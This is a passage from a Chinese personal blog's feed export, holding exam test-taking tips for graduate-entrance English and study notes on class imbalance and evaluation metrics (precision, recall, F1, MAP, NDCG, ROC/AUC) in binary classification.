start="2"><li>消极的</li></ol><p><img src="https://files.shanqianche.cn/202212/1670052687829.png" alt="消极的品质"><br>3. 全能的</p><p><img src="https://files.shanqianche.cn/202212/1670052728021.png" alt="全能的品质"></p><h2 id="听力"><a href="#听力" class="headerlink" title="听力"></a>听力</h2><ol><li>利用一切时间，读题，找关键词</li><li>可以去预判一些常考的考点【因果、并列、转折、举例、男女对话即为换题的标志】</li><li>一般事请都会有波折，即往不好的方向发展</li><li>当没听清时，往主旨上蒙，越是详细越可能出错</li></ol><h2 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h2><p><font color="#00CED1">20mins</font></p><ol><li>原句<font color="#FF1493">重复出现，200%错</font>。正确的都是有改动的，即同意替换。</li><li>文章是<font color="#9400D3">按顺序出题</font>的。你要觉得不是，就是你做错了。</li><li>选项中意思完全相反的2个选项，<font color="#E9967A">其中之一是对的</font>。（要有这个意识）。</li><li>就一般而言，some people，表作者不认同的观点。<font color="#006400">few people，表作者的观点</font>。</li><li>用文章里<font color="#9400D3">举例的句子来作为选项</font>，直接排除。200%错。（要有能辨别这个选项是不是文章中例子的能力）。</li><li>某某人说的话，或者是带引号的，一定要高度<font color="#8B008B">重视</font>。尤其是在段落的后半部分。很有可能就是某个问题的同意替换。即题眼。</li><li>有的时候，一句话可以设2个问题。不过这种情况很少出现了，非常少。。</li><li>文章基本以5段为主（也有6段、7段的），要把握每段之间的关系。一般来说，一段一个题，只是一般来说喔。。</li><li>一篇文章总会有5、6+个长难句，且总会在这里设问题。所以，<font color="#FF8C00">长难句必须要拿下</font>！！</li><li><font color="#9932CC">每段的第一句很重要</font>。尤其总分结构的段。有的时候第一句话就是题眼。考研英语，总分结构或者总分总的段落很多。。</li><li>若文章首段以why为开头的，这里若设题的话，选项里有because的，往往就是正确选项。不过这种类型的题，很少见了。。</li><li>有时候每段的第一句话，仅仅是一个表述。而在第2或3句以后，会出现对比或者转折。一般来说，<font color="#00FFFF">转折后面的是作者的态度</font>。你要注意的是，作者对什么进行了转折。那个关键词你要找出来。</li><li>在应该出现答案的地方，没有答案。。接着往下读。答案可能会在下一段的开头部分。因为文章都是接着说的。要有连贯性。这和7选5的技巧有些相似。不过这种情况并不多见。。</li><li>一个长句看不懂，接着往下看，下一句可能是这个长句的解释说明。是的话，这的地方可能会出题。出的话，答案就在这附近。而实际情况是，文章在谈论某个问题或提出某个观点时，有时会再做进一步的解释说明。这种情况下，这里往往会设问题。不过，这种情况很少见了。。</li><li>有些句子仅仅是解释补充，或者是起过渡作用的。这样句子的特点是，句子比较短。注意，答案一般不会在这儿出现。选项中出现，肯定是<font color="#9932CC">干扰项</font>。你要知道的是，同意替换的句子，大都是长难句。一些作为过渡的句子，不可能是答案。在你读不懂的情况下，要有这个判断力。</li><li>正确选项都是原文中的个别几个词的<font color="#D2691E">同义替换</font>。阅读理解历年的所有真题，都是同意替换！！就看你能不能找得到。考研英语，考的就是这个！！那个关键词，就看你找没找得到，不管是什么类型的题。。</li><li>每一个问题，在原文中，都要有一个定位。然后精读，找出那个中心句或者关键词。要抓文章的中心主旨和各段落的大意，阅读理解考的就是这个“<font color="#057748">中心句</font>”。</li><li>选项中的几个单词，是该段中不同句子里的单词拼凑的，有时看上去很舒服，注意，干扰项。还有从不同的段落里的词拼凑到一起的，直接排除。总之，选项的单词是<font color="#A52A2A">拼凑的</font>，肯定错。</li><li>一定要注意文章中句子的宾语部分，尤其是长难句中主干的宾语。上面说了，考研英语大都是长难句里设题。你要知道的是，长难句里，最可能是出题的就是句子的主干部分！主干的主语、宾语是什么，一定要知道。<font color="#FF1493">正确选项</font>的题眼往往就在这儿。当然，还有一些起修饰、限定作用的词，一定要看仔细。小心陷阱。</li><li>若某个问题，是特别长的一个句子，一定要看清问的是什么，别打马虎眼。这是做题时需要留意的地方。</li><li>注意问题的主语是谁，它和原文题眼的主语原则上是一致的。主语不一致，一般来说，都是<font color="#9400D3">错的。</font></li><li>即第6条，某某人说的话，尤其特别长的句子，或者是带引号的。60%以上会出题。题眼就在这儿。这里又提了一遍，就是要引起你的<font color="#057748">重视</font>。</li><li>错误的选项，往往是就文章某一方面而说的，其特点是：所涉及的，仅仅是某一个小问题，或者很具体，<font color="#B22222">非常具体的一件实事</font>。200%错误选项。这是考研英语最经常遇到的干扰项。一定要会识别。</li><li>中国人出的题。多是总-分结构，或者总-分-总。所以每段开头结尾，都要注意。（这里指的是中间没有出现转折的段落）。整篇文章的<font color="#057748">开头结尾</font>。也要重视。</li><li>文章的结构，要么总-分或总-分-总，要么转折、对比，要么举例说明。就这么几个套路。</li><li>对选项中的“重点词”（即主语、宾语、修饰语）都要看清楚。有的时候，选项中，会对原文中本来正确的事做错误的修改，来作为干扰项。你要注意的是，选项句子的主语（与原文）是否一致、宾语是否符合原文意思，或者用一些牵强的修饰词，来做一些特殊的限定。要看清楚。这是干扰项的特点之一。</li><li>某人说过的话，有时并不是题眼，但可以从侧面或某个角度来反映作者的观点，也就是作者想表达的。<font color="#00FFFF">正确答案都是和这样的观点相一致的</font>。要把握关键词，有感情色彩的词。做题时，要有这个意识。</li><li>就某个词或者某个句子设问题，不用猜词。<font color="#057748">就一条，文章主旨</font>！ 不用去研究这个词什么意思，把握主旨即可。全文主旨和段落主旨（前者更重要）。</li><li>接着28条说，不管什么题型，上面说的还是其他别的题型。很绝对的说，反映主旨的肯定对，前提是你能确定它就是主旨。考研英语，一直到2011年，这一条还没变过。所以，文章读不太懂，但能把握作者想表达的意思即可。如2011年争议题37题。</li><li>注意中心句（即题眼）和前后句子之间的关系，是接着说的，还是转折关系。这里出题的话，要把握和<font color="#8A2BE2">前后句子之间的关系</font>。是并列关系的，可以从这些句子里找同义词。是转折关系的，就通过转折关系句子里的关键词的相反意思来判断。前提是在你读不懂的情况下。</li><li>凡是举例的，都是为了说明观点的。那么，这个观点（中心句），一般来说，会在举例之前就表达了。但有时候也在举例之后。总之，<font color="#bf242a">作者举例想说明的这个观点，你一定要找出来</font>。</li><li>排除2个选项以后，选出和文章主旨相关的选项即可。不知道主旨就把握关键词。</li><li>词汇题的正确答案，往往隐藏在原文的该处附近（就是那个<font color="#0000FF">同义替换词</font>），原文这附近的句子，是并列关系或者解释说明句的，就从这些句子的关键词的相近意思去把握。是转折关系的，就从关键词的相反意思去把握。总之，你要找的就是那个关键词。和30条一起理解吧。。</li><li>如果原文中出现“ A is B and C”。若某一问题，选项中出现了B没C，或者只出现C没B。<font color="#A52A2A">肯定错</font>，直接排除。可能你会问了，同时出现B and C 咋办？ 目前还没出现过这种情况。。注意，这里说的B和C，是单词或者短语。。这是干扰项的特点之一。 实际情况是，这个<font color="#B22222">句子不是题眼</font>。</li><li>接34题说，还一种情况是，若B和C是2个长句子，中间用分号隔开的。且这两个句子都是作者想表达的，选项中都出现了。。一般来说，选项中会对其中之一做错误的修改来作为干扰项。而另一个是对的。（如05年TEXT1 ，第一题。不过总体来说，这种题型非常非常少见。偶在这里想说的是34条。这样的干扰项，你要会识别。）</li><li>注意几个词，yet表转折，hardly表否定。while 有时是比较，有时也表转折。比较的时候，注意比较的对象，要弄清楚。转折的时候，你<font color="#0000FF">要知道作者对什么进行了转折</font>。</li><li>如果你对“关键词”比较蒙，或者你想问：我怎么知道哪个是关键词？解释一下，关键词就是句子中主干的宾语。尤其是一些你觉得比较重要的句子。这样的句子多数是长难句。一般来说，一个句子主干的主语，宾语，和其他的修饰部分，都是很重要的！！ 宾语是主语的宾语，所以，和主语是要对上号的，对不上不行。（也就是26条的主语是否一致）。至于修饰的部分，干扰项常常在这里做手脚，比如会有一些特殊的限定，千万要留意，别疏忽了。。</li><li>什么是中心句？即反应文章的主旨和每一段的中心意思的一句话。这句话是客观存在的。也就是作者的观点。中心句即题眼，选出正确答案，看的就是中心句。只有中心句才能选出正确答案。所以，中心句不知道在哪，或者读不懂，很难选出正确答案。中心句的具体位置，见下条。</li><li><font color="#7FFF00">很关键的一条</font>，抓住每段的中心意思，也就是中心句。每段至少一句，最多2句。 一般来说，总分结构的段落，中心句一般在段首。举例段一般在举例前后。转折段，中心句在出现转折的地方，或者后一句（一般来说在该段的第三行上下浮动）。再就是某某人说的话。要注意这句话和前后句的关系，是并列还是转折。然后来把握这句话的意思，把握不了就通过前后句是并列还是转折关系的关键词来把握。</li><li>每个问题，要还原到文章具体的某一段落。若此问题在某段的后半部分，且你没有太看懂，这段已经完事了。。要养成一个习惯。<font color="#1E90FF">接着看一下段的第一句话</font>。实在做不出来的话，就选那个和下一段第一句话的意思差不多的选项。只能这样了。。 （貌似是13条的重复）补充下，这只是小技巧，只起补充作用，有时候用不上。。</li><li>每段的第三行，一般来说，也是该段的第3句话（也可能是第2、4句话）。其特点是：句子很长，由两句或者两句以上组成，是个长难句。尤其是 that mean ，the notion is that 之类的，一定要重视。要把握句子的主干。作者想说的是什么（把握作者强调的是哪个句子）。看清楚哪句话是为了修饰哪句话的。这样的句子，若出题的话，句子的主干就是正确选项。起补充修饰作用的一定要看清楚。。每段最重要的三个地方：<font color="#0000FF">段首，段尾，和这儿</font>。再就是带引号的。中心句一般就在这几个地方。 其实也就这么几个地方。。别的地方一般都是过渡句。。</li><li>若是转折段的话，要注意转折的那个句子，一般都是在<font color="#0000FF">41条</font>的那个地方（即第三行上下浮动）。转折前后都要看，看对比的是什么。在看不懂的情况下，通过前面的，来翻译后面的（<font color="#00FFFF">反向翻译</font>），来找关键词。反之亦然。</li><li>最后一段，主要看段首和段尾。（最后一段是转折段的情况很少）。若是叙事段的话，叙事部分以外的，重点看。叙事部分尽量看懂。<font color="#725e82">非叙事部分非常重要</font>。一般段首若出现答案的话，段尾可能会作干扰项（见54条），但也不是绝对的（有时段首段尾都会有答案的提示）。段尾若出现答案的话，段首可能会很普通。 一定要把握哪一句话是重点，选项中有相近意思的不是片面的叙述，一般就是正确答案。要把握重点的句子提到的被说明对象（句子主干的宾语），也就是作者关注的。</li><li>选项中出现<font color="#7FFF00">ONLY </font>的，目前还没有对的。</li><li>说明原因的，且<font color="#057748">仅仅是说明原因</font>而已。目前没有对的。</li><li>中心句特别长的，2小句组成，选项中这2句都出现了，怎么排除？反映主旨的是对的。就是作者关注的对象！还一选项是对其进行具体的解释说明，或者补充，或是对主旨的一个具体现象的反应，或是对其造成的后果的叙述。这一选项一般会做错误的修改而作为<font color="#A52A2A">干扰项</font>（即使不做错误的修改也一样是干扰项）总之，这样的题，符合<font color="#1E90FF">28、29</font>条的就是对的。符合<font color="#B22222">23</font>条的，就是错的。</li><li>一定要注意，谁是用来修饰谁的。<font color="#B22222">起修饰作用</font>的词或句子，来做选项，一般是错的。<font color="#057748">被修饰的那部分</font>来作选项，一般是对的。</li><li>因果关系的题，很直接、很简单的因果关系，直接排除。间接的因果，反映主旨的，可能是对的。 总之，因果关系的题，把握主旨就可以了。文中提到的直接因果，如具体的事或是什么的。<font color="#8B0000">都是干扰项</font>。</li><li>48的补充，正确选项反应的，往往是实质的，根本的内容。选项反应的若是<font color="#bf242a">很具体</font>的某一表现，一般都是干扰项。</li><li>干扰项有时出现的生词（可能是你不认识的），是与文章主题无关的词，而非同意替换。（这就需要你的基本功了）</li><li>新趋势，有些题要懂文章才能做出来。读不懂很难选出来。而且，长难句明显增多。有时，它会让你崩溃到单词都认识，却不知道文章说的是什么。这时候什么技巧都不好使了。所以，一定要提高基本功。起码你要知道文章大概说的是啥，也就是谁和谁的关系。任何一篇文章的主旨，基本上都可以用“谁和谁的关系”来概括。</li><li>、通过首段或者前两段，来把握信息点。也就是作者想说的，<font color="#008B8B">是谁和谁的关系</font>？</li><li>接着上面说，一篇文章谈的是什么，或者说“谁与谁的关系”，一定要弄懂。这个具体的什么“关系”弄不懂的话，“谁与谁”一定要弄明白。比如，<font color="#00008B">一篇文章说的是A与B之间如何如何。若问题问你A，选项有B的，往往就是正确答案。若问你B，你就可以先把没有A的选项排除</font>。</li><li>最新趋势，最后一段，段尾很明显不是总结，而是以补充为主的句子。注意，这里可能会<font color="#FF1493">以干扰项的形式出现。</font></li><li>如上所说，中心句出现的地方无非就是段首、段中、段尾，或者带引号的句子。但是，这也是干扰项常常出现的地方。所以，你的基本功，对文章理解的程度，是你必须具备的能力。任何一门考试都有技巧，但是想拿理想的分数，光靠技巧是不现实的。</li><li>有的时候，你会遇到出现2到3个否定词的句子。否定再否定，或者否定否定再否定。遇到了，尤其是3重否定的，基本上<font color="#00008B">这里会设题</font>，这句话里的关键词一定要找出来。这个地方是要练的，到时候出现了，别蒙，别犯怵。。</li><li>再补充一条，<font color="#00008B">however 后面的句子一定要重视</font>。比如有一年的其中一篇的3个题，题眼都是however 后面的句子。 所以，这个词一定要敏感。</li></ol><p><strong><font color="#FF8C00">技巧done</font></strong></p><h2 id="段落匹配"><a href="#段落匹配" class="headerlink" title="段落匹配"></a>段落匹配</h2><p><font color="#9400D3">10mins</font></p><ol><li>看选项，勾关键词【能看懂的】<font color="#FF8C00">3~4mins</font></li><li>找对应的两个及以上的关键词</li></ol><p><strong><font color="#FF8C00">技巧done</font></strong></p><h2 id="选词填空"><a href="#选词填空" class="headerlink" title="选词填空"></a>选词填空</h2><p><font color="#9400D3">10mins</font></p><ol><li>先标词性在选词 </li></ol><h2 id="翻译"><a href="#翻译" class="headerlink" title="翻译"></a>翻译</h2><ol><li>替换+尬写</li><li>看一下<a href="https://www.bilibili.com/video/BV1MN411Z7Lu?spm_id_from=333.788.b_765f64657363.3">热点词</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> exam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> exam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二分类之类别不平衡</title>
      <link href="/2021/05/31/%E4%BA%8C%E5%88%86%E7%B1%BB%E4%B9%8B%E7%B1%BB%E5%88%AB%E4%B8%8D%E5%B9%B3%E8%A1%A1/"/>
      <url>/2021/05/31/%E4%BA%8C%E5%88%86%E7%B1%BB%E4%B9%8B%E7%B1%BB%E5%88%AB%E4%B8%8D%E5%B9%B3%E8%A1%A1/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/massquantity/p/8550875.html">机器学习之类别不平衡问题 (1) —— 各种评估指标 - massquantity - 博客园</a><br><a href="https://www.zhihu.com/question/269698662">欠采样（undersampling）和过采样（oversampling）会对模型带来怎样的影响？</a><br><a href="https://www.cnblogs.com/inchbyinch/p/12642760.html">详解类别不平衡问题 - 天地辽阔 - 博客园</a></p><h2 id="类别不平衡-class-imbalance"><a href="#类别不平衡-class-imbalance" class="headerlink" title="类别不平衡(class-imbalance)"></a>类别不平衡(class-imbalance)</h2><blockquote><p><font color="#D2691E"> 惯例</font><br>在二分类问题中，一般将数目少的类别视为正例，数目多的类别视为负例</p></blockquote><p><font color="#228B22">也叫数据倾斜，数据不平衡指分类任务中不同类别的训练样例数目差别很大的情况。</font></p><h2 id="各种评估指标"><a href="#各种评估指标" class="headerlink" title="各种评估指标"></a>各种评估指标</h2><p><a href="https://www.cnblogs.com/massquantity/p/8550875.html">机器学习之类别不平衡问题 (1) —— 各种评估指标 - massquantity - 博客园</a></p><p><img src="http://files.shanqianche.cn/202167/1623024781731.png" alt="混淆矩阵图"></p><ul><li>True Positive(真正例，TP)：实例为正例，预测为正例</li><li>False Negative (假负例，FN)：实际为正例，预测为负例。</li><li>True Negative (真负例，TN)：实际为负例，预测为负例。</li><li>False Positive (假正例，FP)：实际为负例，预测为正例。</li></ul><ol><li>Precision (查准率) = <math xmlns="http://www.w3.org/1998/Math/MathML"><mfrac><mrow><mi>T</mi><mi>P</mi></mrow><mrow><mi>T</mi><mi>P</mi><mo>+</mo><mi>F</mi><mi>P</mi></mrow></mfrac></math> ，Precision衡量的是<font color="#7FFF00">所有被预测为正例的样本中有多少是真正例</font>。<font color="#A52A2A">但Precision并没有表现有多少正例是被错判为了负例(即FN)</font>，举个极端的例子，分类器只将一个样本判为正例，其他所有都判为负例，这种情况下Precision为100%，但其实遗漏了很多正例，所以Precision常和下面的Recall (TPR) 相结合。</li><li>True Positive Rate (TPR，真正例率) = <math xmlns="http://www.w3.org/1998/Math/MathML"><mfrac><mrow><mi>T</mi><mi>P</mi></mrow><mrow><mi>T</mi><mi>P</mi><mo>+</mo><mi>F</mi><mi>N</mi></mrow></mfrac></math> ，又称__Recall__(查全率,召回率)，Sensitivity(灵敏性)。Recall (TPR)衡量的是所有的正例中有多少是被<font color="#008B8B">正确分类</font>了，也可以看作是为了<font color="#057748">避免假负例(FN)的发生</font>，<font color="#0000FF">即将真正例分类到真正中而不是通过假负来判断的</font>，因为TPR高意味着FN低。Recall的问题和Precision正相反，没有表现出有多少负例被错判为正例(即FP)，若将所有样本全划为正例，则Recall为100%，但这样也没多大用。</li><li>True Negative Rate (TNR，真负例率) = <math xmlns="http://www.w3.org/1998/Math/MathML"><mfrac><mrow><mi>T</mi><mi>N</mi></mrow><mrow><mi>T</mi><mi>N</mi><mo>+</mo><mi>F</mi><mi>P</mi></mrow></mfrac></math> ，又称Specificity(特异性)。Specificity衡量的是<font color="#006400">所有的负例中有多少是被正确分类</font>了，由于<font color="#1E90FF">类别不平衡问题中通常关注正例能否正确被识别，Specificity高则FP低，意味着很少将正例错判为负例，即该分类器对正例的判别具有“特异性”，在预测为正例的样本中很少有负例混入</font>。</li><li>False Positive Rate (FPR，假正例率) = <math xmlns="http://www.w3.org/1998/Math/MathML"><mfrac><mrow><mi>F</mi><mi>P</mi></mrow><mrow><mi>T</mi><mi>N</mi><mo>+</mo><mi>F</mi><mi>P</mi></mrow></mfrac></math> = 1− $TNR$ , 由混淆矩阵可以看出该指标的<font color="#D2691E">着眼点</font>在于负例，意为有多少负例被错判成了正例。在ROC曲线中分别以TPR和FPR作为纵、横轴作图，显示出一种正例与负例之间的“<font color="#9400D3">博弈</font>”，在下篇文章中详解。</li></ol><p>F1 score = <math xmlns="http://www.w3.org/1998/Math/MathML"><mfrac><mn>2</mn><mrow><mfrac><mn>1</mn><mtext>&#xA0;recall&#xA0;</mtext></mfrac><mo>+</mo><mfrac><mn>1</mn><mtext>&#xA0;precision&#xA0;</mtext></mfrac></mrow></mfrac><mo>=</mo><mfrac><mrow><mn>2</mn><mo>&#xD7;</mo><mtext>&#xA0;precision&#xA0;</mtext><mo>&#xD7;</mo><mtext>&#xA0;recall&#xA0;</mtext></mrow><mrow><mtext>&#xA0;precision&#xA0;</mtext><mo>+</mo><mtext>&#xA0;recall&#xA0;</mtext></mrow></mfrac></math></p><p>F1分数（F1-Score），又称为平衡F分数（BalancedScore），是一个综合指标,它被定义为精确率和召回率的调和平均数 (harmonic mean),数值上一般接近于二者中的<font color="#1E90FF">较小值</font>，因此如果F1 score比较高的话，意味着Precision和Recall都较高。</p><blockquote><p><font color="#7FFF00"> 知识补充</font><br>调和平均数（harmonic mean）又称倒数平均数，是总体各统计变量倒数的算术平均数的倒数。调和平均数是平均数的一种。<br>算数平均数中，重要性取决于绝对值大的一方（强），而在调和平均数中，<font color="#057748">重要性</font>取决于<font color="#8B0000">绝对值小的一方</font>（弱）。</p></blockquote><p>FP和FN还有个还有个与之相关的概念，那就是统计假设检验中的<font color="#483D8B">第一类错误</font> (Type I error)和<font color="#483D8B">第二类错误 (Type II error)</font> 。由于我们比较关心正例，所以将负例视为零假设，正例视为备选假设，则第一类错误为错误地拒绝零假设 (负例)，选择备选假设，则为FP；第二类错误为错误地接受零假设，则为FN。</p><blockquote><p><font color="#006400">知识补充</font><br>零假设的内容一般是希望证明其错误的假设。</p></blockquote><hr><p>上面介绍的这些指标都没有考虑检索结果的先后顺序，而像搜索问题中我们通常希望第一个结果是与查询最相关的，第二个则是次相关的，以此类推，因而有时候不仅要预测准确，<font color="#6495ED">对于相关性的顺序也非常看重</font>。所以最后介绍两个广泛应用的<font color="#9400D3">排序指标</font>。</p><p>Mean Average Precision (MAP，平均准确率均值)，对于<font color="#B8860B">单个</font>信息需求，返回结果中在每篇相关文档上 Precision 的平均值被称为 Average Precision (AP)，然后对<font color="#D2691E">所有</font>查询取平均得到 MAP。<br><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>AP</mi><mo>=</mo><mfrac><mrow><msubsup><mo>&#x2211;</mo><mrow><mi>k</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><mi>P</mi><mo>(</mo><mi>k</mi><mo>)</mo><mo>&#xD7;</mo><mo>rel</mo><mo>(</mo><mi>k</mi><mo>)</mo></mrow><mi>M</mi></mfrac></math><br><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>MAP</mi><mo>=</mo><munderover><mo>&#x2211;</mo><mrow><mi>q</mi><mo>=</mo><mn>1</mn></mrow><mi>Q</mi></munderover><mfrac><msub><mi>AP</mi><mi>q</mi></msub><mi>Q</mi></mfrac></math><br>其中 P(k) 为前 k 个结果的 Precision，又可写为P@k。 rel(k) 表示第 k 个结果是否为相关文档，相关为1不相关为0，M 表示所有相关文档的数量，n 表示所有文档数量。如果只关心<font color="#00008B">前 K 个查询的情况</font>，则是下式：<br><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>AP</mi><mo>@</mo><mi>K</mi><mo>=</mo><mfrac><mrow><msubsup><mo>&#x2211;</mo><mrow><mi>k</mi><mo>=</mo><mn>1</mn></mrow><mi>K</mi></msubsup><mi>P</mi><mo>(</mo><mi>k</mi><mo>)</mo><mo>&#xD7;</mo><mo>rel</mo><mo>(</mo><mi>k</mi><mo>)</mo></mrow><msub><mi>M</mi><mi>K</mi></msub></mfrac></math><br><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>MAP</mi><mo>@</mo><mi>K</mi><mo>=</mo><munderover><mo>&#x2211;</mo><mrow><mi>q</mi><mo>=</mo><mn>1</mn></mrow><mi>Q</mi></munderover><mfrac><mrow><msub><mi>AP</mi><mi>q</mi></msub><mo>@</mo><mi>K</mi></mrow><mi>Q</mi></mfrac></math><br>这里的 <math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>M</mi><mi>K</mi></msub></math> 为前 K 个结果中相关文档的数量。</p><p>对于单个信息需求来说，Average Precision 是<font color="#bf242a"> PR 曲线</font>下面积的近似值，因此 MAP 可粗略地认为是某个查询集合对应的多条 PR 曲线下面积的平均值。</p><p><strong>Normalized Discounted Cumulative Gain</strong> (NDCG，归一化折扣累计增益) 。如果说 <font color="#0000FF">MAP 是基于 0/1 二值描述相关性</font>，那么 <font color="#9932CC">NDCG 则是可将相关性分为多个等级的指标</font>。<br>对于信息检索和推荐之类的问题，每一个返回的结果都被赋予一个相关性分数 rel，则 NDCG 中的 CG 表示前 k 个结果的分数之和，即累计增益 ：<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>CG</mi><mi>k</mi></msub><mo>=</mo><munderover><mo>&#x2211;</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><msub><mi>rel</mi><mi>i</mi></msub></math></p><p>CG 没有考虑推荐的次序，所以在此基础上引入对结果顺序的考虑，即<font color="#DC143C">相关性高的结果</font>若排在后面则会受更多的惩罚，于是就有了 DCG (discounted CG)，折扣累积增益。公式如下：<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>DCG</mi><mi>k</mi></msub><mo>=</mo><munderover><mo>&#x2211;</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><mfrac><mrow><msup><mn>2</mn><msub><mi>rel</mi><mi>i</mi></msub></msup><mo>-</mo><mn>1</mn></mrow><mrow><msub><mi>log</mi><mn>2</mn></msub><mo>(</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo>)</mo></mrow></mfrac></math></p><p>i 表示一个结果在结果集中的顺序，如果该结果 rel 很高，但排在后面，意味着分母 log2(i+1) 会变大，则相应的总体 DCG 会变小 (注意这里的 log 是以 2 为底的)。</p><p>对于不同的查询，往往会返回不同的结果集，而不同结果集之间因为大小不同难以直接用 DCG 进行比较，所以需要进行<font color="#006400">归一化</font>，这其实和机器学习中不同特征因量纲不同要进行归一化差不多意思。这个归一化后的指标就是 NDCG ：<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>NDCG</mi><mi>k</mi></msub><mo>=</mo><mfrac><msub><mi>DCG</mi><mi>k</mi></msub><msub><mi>IDCG</mi><mi>k</mi></msub></mfrac></math><br>其中 IDCG 表示 Ideal DCG， 指<font color="#006400">某个查询所能返回的最好结果集</font>，IDCG 的值也是结果集中最大的。将所有结果按相关性大小排序，计算出的 DCG 即为前 k 个结果的 IDCG：<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>IDCG</mi><mi>k</mi></msub><mo>=</mo><munderover><mo>&#x2211;</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mo>|</mo><mi>R</mi><mi>E</mi><mi>L</mi><mo>|</mo></mrow></munderover><mfrac><mrow><msup><mn>2</mn><msub><mi>rel</mi><mi>i</mi></msub></msup><mo>-</mo><mn>1</mn></mrow><mrow><msub><mi>log</mi><mn>2</mn></msub><mo>(</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo>)</mo></mrow></mfrac></math><br>其中 |REL| 表示按相关性顺序排列的结果集。因此 DCG 的值介于 (0, IDCG] ，故 NDCG 的值介于(0,1]，这样就起到了归一化的效果。不同查询或用户的 NDCG 平均起来可以用以评估一个搜索引擎或推荐系统的整体效果。</p><p>NDCG 的缺点是<font color="#483D8B">需要预先指定每一个返回结果的相关性</font>，这个超参数需要人为指定。</p><h2 id="常用的评估方法"><a href="#常用的评估方法" class="headerlink" title="常用的评估方法"></a>常用的评估方法</h2><h3 id="ROC曲线"><a href="#ROC曲线" class="headerlink" title="ROC曲线"></a>ROC曲线</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>ROC曲线常用于二分类问题中的模型比较，主要表现为一种<font color="#0000FF">真正例率 (TPR) </font>和<font color="#0000FF">假正例率 (FPR) </font>的权衡。</p><p><strong><font color="#ff7500">概述：</font></strong> 是在不同的分类阈值 (threshold) 设定下分别以TPR和FPR为纵、横轴作图。由ROC曲线的两个指标，<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>T</mi><mi>P</mi><mi>R</mi><mo>=</mo><mfrac><mrow><mi>T</mi><mi>P</mi></mrow><mi>P</mi></mfrac><mo>=</mo><mfrac><mrow><mi>T</mi><mi>P</mi></mrow><mrow><mi>T</mi><mi>P</mi><mo>+</mo><mi>F</mi><mi>N</mi></mrow></mfrac></math>，<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>F</mi><mi>P</mi><mi>R</mi><mo>=</mo><mfrac><mrow><mi>F</mi><mi>P</mi></mrow><mi>N</mi></mfrac><mo>=</mo><mfrac><mrow><mi>F</mi><mi>P</mi></mrow><mrow><mi>F</mi><mi>P</mi><mo>+</mo><mi>T</mi><mi>N</mi></mrow></mfrac></math> 可以看出，当一个样本被分类器判为正例，若其本身是正例，则TPR增加；若其本身是负例，则FPR增加，因此ROC曲线可以看作是随着阈值的不断移动，所有样本中正例与负例之间的“对抗”。曲线越靠近左上角，意味着<font color="#FF1493">越多的正例优先于负例，模型的整体表现也就越好</font>。</p><p><img src="http://files.shanqianche.cn/202167/1623072321656.png" alt="ROC曲线"></p><p> <strong><font color="#008B8B">AUC (Area Under the Curve)</font></strong></p><p> <img src="http://files.shanqianche.cn/202167/1623073223653.png" alt="ROC space"></p><p>先看一下ROC曲线中的随机线，图中[0,0]到[1,1]的虚线即为随机线，该线上所有的点都<font color="#00FFFF">表示该阈值下TPR=FPR</font><br>根据定义，<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>T</mi><mi>P</mi><mi>R</mi><mo>=</mo><mfrac><mrow><mi>T</mi><mi>P</mi></mrow><mi>P</mi></mfrac></math>，表示所有正例中被预测为正例的概率；<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>F</mi><mi>P</mi><mi>R</mi><mo>=</mo><mfrac><mrow><mi>F</mi><mi>P</mi></mrow><mi>N</mi></mfrac></math>，表示所有负例中被被预测为正例的概率。<font color="#B8860B">若二者相等，意味着无论一个样本本身是正例还是负例，分类器预测其为正例的概率是一样的，这等同于随机猜测</font>（注意这里的“随机”不是像抛硬币那样50%正面50%反面的那种随机）。</p><p>上图中B点就是一个随机点，无论是样本数量和类别如何变化，始终将75%的样本分为正例。</p><p><font color="#B8860B">ROC曲线围成的面积 (即AUC)可以解读为</font>：从所有正例中随机选取一个样本A，再从所有负例中随机选取一个样本B，分类器将A判为正例的概率比将B判为正例的概率大的可能性。可以看到位于随机线上方的点(如图中的A点)被认为好于随机猜测。在这样的点上TPR总大于FPR，意为正例被判为正例的概率大于负例被判为正例的概率。<br>从另一个角度看，由于画ROC曲线时都是先将所有样本按分类器的<font color="#1E90FF">预测概率</font>排序，<font color="#B22222">所以AUC反映的是分类器对样本的排序能力</font>，依照上面的例子就是A排在B前面的概率。<font color="#008B8B">AUC越大，自然排序能力越好</font>，即分类器将越多的正例排在负例之前。</p><p><font color="#8B0000">ROC曲线的绘制方法</font>：假设有P个正例，N个反例，首先拿到分类器对于每个样本预测为正例的概率，根据概率对所有样本进行<font color="#006400">逆序排列</font>，然后将<font color="#0000FF">分类阈值设为最大</font>，即把所有样本均预测为反例，此时图上的点为 (0,0)。然后将分类阈值依次设为每个样本的预测概率，即依次将每个样本划分为正例，如果该样本为真正例，则TP+1，即<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>T</mi><mi>P</mi><mi>R</mi><mo>+</mo><mfrac><mn>1</mn><mi>P</mi></mfrac></math>; 如果该样本为负例，则FP+1，即<math 